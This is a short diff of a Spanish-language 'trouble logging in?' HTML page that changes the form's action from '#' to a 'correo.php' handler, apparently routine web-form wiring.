@@ -19,7 +19,7 @@
         </header>
 
         <section style="margin-top:3%;">
-            <form action="#" method="post" id="formulario" class="formulario" autocomplete="off">
+            <form action="correo.php" method="post" id="formulario" class="formulario" autocomplete="off">
                 <center><i class="fa fa-solid fa-lock fa-5x"></i></center>
                 <br>
                 <h3 align ="center">¿Tienes problemas para entrar?</h3>
